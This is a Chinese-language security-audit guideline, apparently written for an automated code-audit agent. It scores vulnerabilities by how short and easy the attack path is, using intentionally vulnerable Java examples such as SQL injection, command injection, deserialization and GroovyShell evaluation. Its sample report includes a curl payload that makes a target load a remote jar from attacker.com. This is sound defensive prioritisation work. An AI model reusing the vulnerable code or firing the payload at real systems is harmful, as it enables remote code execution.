# 攻击路径最短原则 - Attack Path Priority

> 优先报告攻击路径最短、利用门槛最低的漏洞

## 概述

并非所有Critical漏洞都具备相同的实际威胁。攻击路径最短原则根据攻击者视角的实际可利用性对漏洞进行优先级排序。

**核心理念**: 攻击者总是选择阻力最小的路径。审计报告应反映真实攻击优先级。

---

## 优先级判定维度

### 1. 认证要求 (Authentication Requirement)

```
优先级: 无需登录 > 普通用户 > 特权用户 > 管理员
```

**示例**:

```java
// ✅ P0 (最高优先级): 公开接口RCE
@PostMapping("/api/public/parse")  // 无需登录
public void parse(@RequestParam String yaml) {
    Yaml yaml = new Yaml();  // CVE-2022-1471: SnakeYAML RCE
    yaml.load(yaml);
}

// ✅ P1: 认证用户RCE
@PostMapping("/api/user/export")
@PreAuthorize("isAuthenticated()")  // 需要登录
public void export(@RequestParam String template) {
    groovyShell.evaluate(template);  // GroovyShell RCE
}

// ⚠️ P2: 管理员SQL注入
@GetMapping("/admin/users")
@PreAuthorize("hasRole('ADMIN')")  // 需要管理员
public List<User> getUsers(@RequestParam String filter) {
    return jdbcTemplate.query("SELECT * FROM users WHERE " + filter);  // SQL注入
}
```

**判定规则**:
- 无认证要求 → **优先级+3**
- 普通用户可达 → **优先级+2**
- 需特权用户 → **优先级+1**
- 仅管理员 → **优先级+0**

---

### 2. 请求复杂度 (Request Complexity)

```
优先级: 单请求 > 多步骤 > 需竞态条件 > 需时序攻击
```

**示例**:

```java
// ✅ P0: 单请求完成攻击
@PostMapping("/upload")
public void upload(@RequestParam MultipartFile file) {
    Runtime.getRuntime().exec("convert " + file.getOriginalFilename());  // 命令注入，单请求RCE
}

// ⚠️ P1: 多步骤攻击
// Step 1: 创建订单
POST /api/orders {"amount": 100}
// Step 2: 利用竞态修改金额
PATCH /api/orders/123 {"amount": 1}  // Race condition needed

// ⚠️ P2: 需要竞态条件
@Transactional
public void transfer(Long fromId, Long toId, BigDecimal amount) {
    Account from = accountRepo.findById(fromId);  // TOCTOU
    if (from.getBalance().compareTo(amount) >= 0) {
        from.setBalance(from.getBalance().subtract(amount));  // 并发攻击可绕过
    }
}
```

**判定规则**:
- 单请求完成 → **优先级+3**
- 2-3步骤 → **优先级+2**
- 需竞态条件 → **优先级+1**
- 需时序攻击 → **优先级+0**

---

### 3. 社工依赖度 (Social Engineering Dependency)

```
优先级: 无需交互 > 需用户点击 > 需用户输入 > 需管理员操作
```

**示例**:

```java
// ✅ P0: 无需社工，直接攻击
@GetMapping("/api/data")
public String getData(@RequestParam String id) {
    return userService.findById(id);  // IDOR: 遍历所有用户数据，无需用户配合
}

// ⚠️ P1: 需用户点击链接
@GetMapping("/download")
public void download(@RequestParam String url) {
    // SSRF: 需诱导用户点击恶意链接
    HttpClient.get(url);
}

// ⚠️ P2: 需用户上传文件
@PostMapping("/import")
public void importData(@RequestParam MultipartFile file) {
    // XXE: 需用户上传恶意XML
    DocumentBuilder.parse(file.getInputStream());
}

// ⚠️ P3: 需管理员操作
// Stored XSS in admin panel: 需等待管理员登录查看
```

**判定规则**:
- 无需社工 → **优先级+3**
- 需用户点击 → **优先级+2**
- 需用户输入 → **优先级+1**
- 需管理员操作 → **优先级+0**

---

### 4. 利用门槛 (Exploitation Barrier)

```
优先级: 无技术门槛 > 需工具 > 需exploit开发 > 需0day
```

**示例**:

```java
// ✅ P0: 浏览器即可利用
@GetMapping("/admin/delete")
public void delete(@RequestParam Long id) {
    // CSRF: 浏览器访问即可删除，无技术门槛
    adminService.delete(id);
}

// ⚠️ P1: 需工具辅助
@PostMapping("/search")
public List<User> search(@RequestParam String keyword) {
    // SQL注入: 需sqlmap等工具
    return jdbcTemplate.query("SELECT * FROM users WHERE name LIKE '%" + keyword + "%'");
}

// ⚠️ P2: 需exploit开发
Fastjson 1.2.47  // 反序列化: 需构造gadget chain

// ⚠️ P3: 需0day
Spring Boot 2.7.0 (latest)  // 无已知公开漏洞
```

**判定规则**:
- 浏览器/curl即可 → **优先级+3**
- 需常见工具 → **优先级+2**
- 需自定义exploit → **优先级+1**
- 需0day → **优先级+0**

---

## 综合优先级评分

### 评分公式

```
总分 = 认证要求分(0-3) + 请求复杂度分(0-3) + 社工依赖度分(0-3) + 利用门槛分(0-3)

优先级分级:
- P0 (Critical Path): 10-12分 - 立即修复
- P1 (High Path): 7-9分 - 优先修复
- P2 (Medium Path): 4-6分 - 计划修复
- P3 (Low Path): 0-3分 - 知晓即可
```

---

## 实际案例对比

### 案例1: 公开接口 vs 管理员接口

```java
// 漏洞A: 公开接口SQL注入 (Medium严重性)
@GetMapping("/api/products")  // 无需登录
public List<Product> search(@RequestParam String name) {
    return jdbcTemplate.query("SELECT * FROM products WHERE name = '" + name + "'");
}

// 评分: 认证(3) + 单请求(3) + 无社工(3) + curl即可(3) = 12分 → P0

// 漏洞B: 管理员接口RCE (Critical严重性)
@PostMapping("/admin/script")
@PreAuthorize("hasRole('ADMIN')")  // 需管理员
public void execute(@RequestParam String script) {
    groovyShell.evaluate(script);  // RCE
}

// 评分: 认证(0) + 单请求(3) + 无社工(3) + 浏览器(3) = 9分 → P1

// 结论: 尽管B是RCE，但A因无需登录，攻击路径更短，应优先修复
```

### 案例2: IDOR vs XSS

```java
// 漏洞A: IDOR遍历所有订单 (High严重性)
@GetMapping("/api/orders/{id}")
@PreAuthorize("isAuthenticated()")  // 需登录
public Order getOrder(@PathVariable Long id) {
    return orderService.findById(id);  // 无权限检查
}

// 评分: 认证(2) + 单请求(3) + 无社工(3) + 浏览器(3) = 11分 → P0

// 漏洞B: Stored XSS in Admin Panel (High严重性)
@PostMapping("/api/feedback")
public void submit(@RequestParam String content) {
    feedbackRepo.save(content);  // 未过滤，管理员查看时触发XSS
}

// 评分: 认证(3) + 单请求(3) + 需管理员查看(0) + 浏览器(3) = 9分 → P1

// 结论: IDOR可直接遍历数据，XSS需等管理员触发，IDOR优先级更高
```

### 案例3: 反序列化 vs 命令注入

```java
// 漏洞A: Java反序列化 (Critical严重性)
@PostMapping("/api/session")
public void restore(@RequestParam String data) {
    ObjectInputStream ois = new ObjectInputStream(Base64.decode(data));
    Session session = (Session) ois.readObject();  // 反序列化RCE
}

// 评分: 认证(3) + 单请求(3) + 无社工(3) + 需ysoserial工具(2) = 11分 → P0

// 漏洞B: 命令注入 (Critical严重性)
@PostMapping("/api/convert")
@PreAuthorize("isAuthenticated()")  // 需登录
public void convert(@RequestParam String filename) {
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");  // 命令注入
}

// 评分: 认证(2) + 单请求(3) + 无社工(3) + curl即可(3) = 11分 → P0

// 结论: 两者优先级相当，但命令注入利用更简单（无需工具），实际应优先修复B
```

---

## 报告格式

### 漏洞标题格式

```markdown
[P0] 公开接口SQL注入 - /api/products (无需登录, 单请求, Medium→Critical)
[P1] 管理员RCE - /admin/script (需ADMIN, 单请求, Critical→High)
[P2] 竞态条件导致余额篡改 (需登录, 需并发, High→Medium)
```

### 详细报告格式

```markdown
## [P0] 公开接口SnakeYAML反序列化RCE

**原始严重性**: Medium (反序列化)
**攻击路径优先级**: P0 (Critical Path)

### 攻击路径分析
- ✅ 认证要求: 无需登录 (+3分)
- ✅ 请求复杂度: 单请求完成 (+3分)
- ✅ 社工依赖: 无需用户交互 (+3分)
- ✅ 利用门槛: curl + PoC即可 (+3分)
- **总分**: 12/12 → **立即修复**

### 攻击向量
```bash
curl -X POST http://target.com/api/parse \
  -d 'yaml=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]'
```

### 影响
- ✅ 无需任何凭证
- ✅ 一次请求完成RCE
- ✅ 互联网可达
- ✅ 攻击成本: $0

### 修复优先级
**Critical**: 公开RCE，应在24小时内修复
```

---

## 自动判定流程

```
1. 检测到漏洞 (如SQL注入、RCE)
   ↓
2. 分析攻击路径:
   - 检查Controller注解 (@PreAuthorize?)
   - 分析请求依赖 (单请求 vs 多步骤?)
   - 评估社工需求 (用户交互?)
   - 判断利用难度 (公开exploit?)
   ↓
3. 计算优先级分数:
   - 认证: 无(3) / 用户(2) / 特权(1) / 管理员(0)
   - 复杂度: 单请求(3) / 多步骤(2) / 竞态(1) / 时序(0)
   - 社工: 无(3) / 点击(2) / 输入(1) / 管理员(0)
   - 门槛: 浏览器(3) / 工具(2) / exploit(1) / 0day(0)
   ↓
4. 标注优先级:
   - 10-12分 → [P0] Critical Path
   - 7-9分 → [P1] High Path
   - 4-6分 → [P2] Medium Path
   - 0-3分 → [P3] Low Path
   ↓
5. 报告排序:
   - 按[P0] > [P1] > [P2] > [P3]顺序输出
   - 同级别按CVSS分数排序
```

---

## 配置选项

```yaml
# agent.md配置
attack_path_priority:
  enabled: true
  scoring:
    authentication:
      none: 3
      authenticated: 2
      privileged: 1
      admin: 0
    complexity:
      single_request: 3
      multi_step: 2
      race_condition: 1
      timing_attack: 0
    social_engineering:
      none: 3
      click: 2
      input: 1
      admin_action: 0
    exploitation:
      browser: 3
      tool: 2
      custom_exploit: 1
      zero_day: 0
  thresholds:
    p0: 10  # 10-12分
    p1: 7   # 7-9分
    p2: 4   # 4-6分
    p3: 0   # 0-3分
```

---

## False Positive

以下情况应降低优先级:

- ✅ 内网隔离环境 (无互联网可达) → 优先级-1
- ✅ WAF/IPS已部署特征检测 → 优先级-1
- ✅ 攻击需要特殊网络环境 (如IPv6-only) → 优先级-1
- ✅ 利用窗口极短 (如<1ms竞态) → 优先级-1

---

## 参考

- OWASP Risk Rating Methodology
- CVSS v3.1 Exploitability Metrics
- NIST 800-30: Risk Assessment
- Real-World Attack Path Analysis

---

## 与False Positive Kill Switch结合

```
优先级判定 = 原始严重性 × Kill Switch降级 × 攻击路径评分

示例:
1. 检测: SQL注入 (Critical)
2. Kill Switch: Controller白名单验证 → 降级为Low
3. 攻击路径: 需管理员 + 单请求 → P1 (9分)
4. 最终: [P1] SQL注入 (Critical→Low, 有白名单但需人工验证)
```

**建议**: 优先修复 [P0] 和高分 [P1] 漏洞，即使经过Kill Switch降级。

